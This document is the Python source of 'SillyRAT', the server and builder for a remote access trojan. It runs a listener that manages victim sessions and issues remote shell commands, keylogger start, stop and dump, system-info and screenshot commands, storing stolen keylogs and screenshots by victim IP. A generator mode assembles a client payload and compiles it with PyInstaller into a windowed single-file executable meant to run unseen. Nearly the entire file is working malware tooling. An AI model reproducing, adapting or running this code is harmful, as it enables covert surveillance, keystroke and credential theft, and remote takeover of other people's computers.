import sys
import os
import socket
import time
import base64
import tabulate
import signal
import subprocess
import argparse
import shutil
import threading
import PyInstaller.__main__
from datetime import datetime

__LOGO__ = """
 ____  _ _ _       ____      _  _____ 
/ ___|(_) | |_   _|  _ \\    / \\|_   _|
\\___ \\| | | | | | | |_) |  / _ \\ | |  
 ___) | | | | |_| |  _ <  / ___ \\| |  
|____/|_|_|_|\\__, |_| \\_\\/_/   \\_\\_|  
             |___/                    
                    %s v1.0 @hash3liZer/@TheFlash2k
"""

class PULL:

    WHITE = '\033[1m\033[0m'
    PURPLE = '\033[1m\033[95m'
    CYAN = '\033[1m\033[96m'
    DARKCYAN = '\033[1m\033[36m'
    BLUE = '\033[1m\033[94m'
    GREEN = '\033[1m\033[92m'
    YELLOW = '\033[1m\033[93m'
    RED = '\033[1m\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    LINEUP = '\033[F'

    def __init__(self):
        if not self.support_colors:
            self.win_colors()
    
    def support_colors(self):
        plat = sys.platform
        supported_platform = plat != 'Pocket PC' and (plat != 'win32' or \
														'ANSICON' in os.environ)
        is_a_tty = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()
        if not supported_platform or not is_a_tty:
            return False
        return True

    def win_colors(self):
        self.WHITE = ''
        self.PURPLE = ''
        self.CYAN = ''
        self.DARKCYAN = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.BOLD = ''
        self.UNDERLINE = ''
        self.END = ''

    def get_com(self, mss=()):
        if mss:
            rtval = input(self.DARKCYAN + "$" + self.END + " [" + self.GREEN + mss[1].ip + self.END + ":" + self.RED + str(mss[1].port) + self.END + "] ")
        else:
            rtval = input(self.DARKCYAN + "$" + self.END + " ")
        rtval = rtval.rstrip(" ").lstrip(" ")
        return rtval

    def print(self, mess):
        print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)

    def function(self, mess):
        print(self.BLUE + "[" + self.UNDERLINE + ":" + self.END + self.BLUE + "] " + self.END + mess + self.END)

    def error(self, mess):
        print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)

    def exit(self, mess=""):
        sys.exit(self.RED + "[" + self.UNDERLINE + "~" + self.END + self.RED + "] " + self.END + mess + self.END)

    def logo(self):
        print(self.DARKCYAN + __LOGO__ % self.YELLOW + self.END)

    def help_c_current(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a Specific Client'),
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('shell'  , 'Launch a New Terminal/Shell.'),
            ('keylogger', 'KeyLogger Module'),
            ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
            ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
            ('exit', 'Exit from SillyRAT!')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_general(self):
        headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('help', 'Shows manual for commands'),
            ('sessions', 'Show all connected clients to the server'),
            ('connect', 'Connect to a Specific Client'),
            ('disconnect', 'Disconnect from Current Client'),
            ('clear', 'Clear Screen'),
            ('exit', 'Exit from SillyRAT!')
        ]
        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_sessions(self):
        sys.stdout.write("\n")
        print("Info       : Display connected sessions to the server!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ sessions")
        sys.stdout.write("\n")

    def help_c_connect(self):
        sys.stdout.write("\n")
        print("Info       : Connect to an available session!")
        print("Arguments  : Session ID")
        print("Example    : \n")
        print("$ connect 56\n")
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Type' + pull.END, pull.BOLD + 'Description' + pull.END)
        lister  = [
            ('ID', 'integer', 'ID of the sessions from the list')
        ]
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def help_c_disconnect(self):
        sys.stdout.write("\n")
        print("Info       : Disconnect current session!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ disconnect")
        sys.stdout.write("\n")

pull = PULL()

class CLIENT:
    
    STATUS = "Active"
    MESSAGE = ""
    KEY     = ")J@NcRfU"

    def __init__(self, sock, addr):
        self.sock    = sock
        self.ip      = addr[0]
        self.port    = addr[1]

    def acceptor(self):
        data = ""
        chunk = ""

        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                self.STATUS = "Disconnected"
                break
            data += chunk.decode('utf-8')
            if self.KEY.encode('utf-8') in chunk:
                try:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8')).decode('utf-8')
                except UnicodeDecodeError:
                    self.MESSAGE = base64.decodebytes(data.rstrip(self.KEY).encode('utf-8'))
                if not self.MESSAGE:
                    self.MESSAGE = " "
                data = ""

    def engage(self):
        t = threading.Thread(target=self.acceptor)
        t.daemon = True
        t.start()

    def send_data(self, val):
        self.sock.send(base64.encodebytes(val.encode('utf-8')) + self.KEY.encode('utf-8'))

    def recv_data(self):
        while not self.MESSAGE:
            try:
                pass
            except KeyboardInterrupt: 
                break
        rtval = self.MESSAGE
        self.MESSAGE = ""
        return rtval

class COMMCENTER:

    CLIENTS = []
    COUNTER = 0
    CURRENT = ()    #### Current Target Client ####
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == "sessions":
                pull.help_c_sessions()
            elif vals[1] == "connect":
                pull.help_c_connect()
            elif vals[1] == "disconnect":
                pull.help_c_disconnect()
        else:
            if self.CURRENT:
                pull.help_c_current()
            else:
                pull.help_c_general()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client

        return False

    def c_ping(self, _id):
        return

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                self.CURRENT = tgt
            else:
                sys.stdout.write("\n")
                pull.error("No client is associated with that ID!")
                sys.stdout.write("\n")
        else:
            sys.stdout.write("\n")
            pull.error("Invalid Syntax!")
            sys.stdout.write("\n")

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END)
        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(pull.RED + str(client[0]) + pull.END)
            toappend.append(pull.DARKCYAN + client[1].ip + pull.END)
            toappend.append(pull.BLUE + str(client[1].port) + pull.END)
            toappend.append(pull.GREEN + client[1].STATUS + pull.END)
            lister.append(toappend)

        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def c_shell(self):
        result = ""
        if self.CURRENT:
            sys.stdout.write("\n")
            while True:
                val = input("# ")
                val = "shell:" + val.rstrip(" ").lstrip(" ")

                if val:
                    if val != "shell:exit":
                        self.CURRENT[1].send_data(val)
                        result = self.CURRENT[1].recv_data()
                        if result.strip(" "):
                          print(result)  
                    else:
                        break
        else:
            sys.stdout.write("\n")
            pull.error("You need to connect before execute this command!")
            sys.stdout.write("\n")

    def c_clear(self):
        subprocess.call(["clear"], shell=True)

    def c_keylogger(self, args):
        if self.CURRENT:
            if len(args) == 2:
                if args[1] == "status":
                    return
                elif args[1] == "on":
                    self.CURRENT[1].send_data("keylogger:on")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result) 

                elif args[1] == "off":
                    self.CURRENT[1].send_data("keylogger:off")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result) 

                elif args[1] == "dump":
                    self.CURRENT[1].send_data("keylogger:dump")
                    result = self.CURRENT[1].recv_data()
                    dirname = os.path.dirname(__file__)
                    dirname = os.path.join( dirname, 'keylogs' )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
                    fl = open( fullpath, 'w' )
                    fl.write( result )
                    fl.close()
                    pull.print("Dumped: [" + pull.GREEN + fullpath + pull.END + "]")
                    
                else:
                    pull.error("Invalid Syntax!")
            else:
                pull.error("Invalid Syntax!")
        else:
            pull.error("You need to connect before execute this command!")

    def c_sysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("sysinfo:")
            result = self.CURRENT[1].recv_data()
            if result.strip(" "):
                print(result)
        else:
            pull.error("You need to connect before execute this command!")

    def c_screenshot(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("screenshot:")
            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join( dirname, 'screenshots' )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
            fl = open( fullpath, 'wb' )
            fl.write( result )
            fl.close()
            pull.print("Saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
        else:
            pull.error("You need to connect before execute this command!")

    def c_exit(self):
        sys.stdout.write("\n")
        pull.exit("See Ya!\n")

class INTERFACE(COMMCENTER):

    SOCKET  = None
    RUNNER  = True

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port

    def bind(self):
        self.SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.SOCKET.bind((self.address, self.port))
            pull.print("Successfuly Bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))
        except Exception as e:
            pull.exit("Unable to bind to %s%s:%i" % (
                pull.RED,
                self.address,
                self.port,
            ))

    def accept_threads(self):
        self.SOCKET.listen(10)

        while self.RUNNER:
            conn, addr = self.SOCKET.accept()
            is_valid = True

            self.COUNTER += 1
            client = CLIENT(conn, addr)
            client.engage()

            self.CLIENTS.append(
                (
                    self.COUNTER,
                    client
                )
            )
                

    def accept(self):
        t = threading.Thread(target=self.accept_threads)
        t.daemon = True
        t.start()

    #### Commands ####

    def execute(self, vals):
        if vals:
            if vals[0] == "exit":
                self.c_exit()
            elif vals[0] == "help":
                self.c_help(vals)
            elif vals[0] == "sessions":
                self.c_sessions()
            elif vals[0] == "ping":
                self.c_ping(vals)
            elif vals[0] == "connect":
                self.c_connect(vals)
            elif vals[0] == "disconnect":
                self.c_disconnect()
            elif vals[0] == "shell":
                self.c_shell()
            elif vals[0] == "clear":
                self.c_clear()
            elif vals[0] == "keylogger":
                self.c_keylogger(vals)
            elif vals[0] == "sysinfo":
                self.c_sysinfo()
            elif vals[0] == "screenshot":
                self.c_screenshot()

    def launch(self):
        pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")

        while True:
            val = pull.get_com(self.CURRENT)
            self.execute(val.split(" "))

    def close(self):
        self.SOCKET.close()

class GENERATOR:

    data = ""
    flname = ""

    def __init__(self, prs):
        self.address = prs.address
        self.port    = prs.port
        self.output  = prs.output
        self.pather  = self.get_path()
        self.v_imports = self.get_imports()
        self.v_consts  = self.get_consts()
        self.v_sysinfo = self.get_sysinfo()
        self.v_screenshot = self.get_screenshot()
        self.v_client  = self.get_client()
        self.v_main    = self.get_main()

    def get_path(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'mods')
        if os.path.isdir(dirname):
            return dirname
        else:
            pull.exit("Files missing to generate the payload!")

    def get_imports(self):
        topen = os.path.join(self.pather, 'imports.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_consts(self):
        data = "CONSTIP = \"%s\"\nCONSTPT = %i" % (self.address, self.port)
        return data

    def get_sysinfo(self):
        topen = os.path.join(self.pather, 'sysinfo.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data
    
    def get_screenshot(self):
        topen = os.path.join(self.pather, 'screenshot.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_client(self):
        topen = os.path.join(self.pather, 'client.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def get_main(self):
        topen = os.path.join(self.pather, 'main.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data

    def tmp_dir(self):
        dirname = os.path.dirname(__file__)
        dirname = os.path.join(dirname, 'tmp')
        
        if not os.path.isdir(dirname):
            os.mkdir(dirname)

        fname   = os.path.join(dirname, 'cl.py')

        return (dirname, fname, 'cl.py')

    def generate(self):
        time.sleep(2)
        pull.function("Compiling modules ... ")
        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        pull.function("Generating one time code for binary ")
        self.flname = self.tmp_dir()
        fl = open(self.flname[1], 'w')
        fl.write(self.data)
        fl.close()
        pull.print("Code generated successfully!")

    def compile(self):
        pull.function("Compiling generated code /\\")
        counter = 1

        t = threading.Thread(target=PyInstaller.__main__.run, args=([
            '--name=%s' % os.path.basename(self.output),
            '--onefile',
            '--windowed',
            '--log-level=ERROR',
            '--distpath=%s' % os.path.dirname(self.output),
            '--workpath=%s' % self.flname[0],
            os.path.join(self.flname[0], self.flname[2])
        ],),)
        t.daemon = True
        t.start()

        while t.is_alive():
            sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END + pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
            time.sleep(1)
            counter += 1
        
        sys.stdout.write("\n")
        pull.print("Compiled Successfully!")

    def clean(self):
        pull.function("Cleaning files and temporary codes")
        shutil.rmtree(self.flname[0])
        pull.print("File: " + self.output)

class PARSER:

    def __init__(self, prs):
        self.address = self.v_address(prs.address)
        self.port    = self.v_port(prs.port)
        self.mode    = self.v_mode(prs.mode)
        if self.mode == "generate":
            self.output = self.v_output(prs.output)

    def v_address(self, str):
        return str

    def v_port(self, port):
        if not port:
            pull.exit("You need to Supply a Valid Port Number")
        
        if port <= 0 or port > 65535:
            pull.exit("Invalid Port Number")

        return port

    def v_mode(self, val):
        if val:
            if val == "bind" or val == "generate":
                return val
            else:
                pull.exit("Invalid Syntax")
        else:
            pull.exit("Invalid Syntax!")

    def v_output(self, val):
        if val:
            if os.path.isdir(os.path.dirname(val)):
                return val
            else:
                pull.exit("Directory doesn't exist!") 
        else:
            pull.exit("You must provide an output Path!")

def main():
    pull.logo()

    parser = argparse.ArgumentParser()

    parser.add_argument('mode', help="Moder")
    parser.add_argument('-a', '--address', dest="address", default="0.0.0.0", type=str, help="Address to Bind to")
    parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
    parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")

    parser = parser.parse_args()

    parser = PARSER(parser)

    if parser.mode == "bind":
        iface = INTERFACE(parser)
        iface.bind()
        iface.accept()
        iface.launch()
        iface.close()
    else:
        pull.function("Starting Generator Mode!")
        generator = GENERATOR(parser)
        generator.generate()
        generator.compile()
        generator.clean()
        pull.function("Done")

if __name__ == "__main__":
    main()
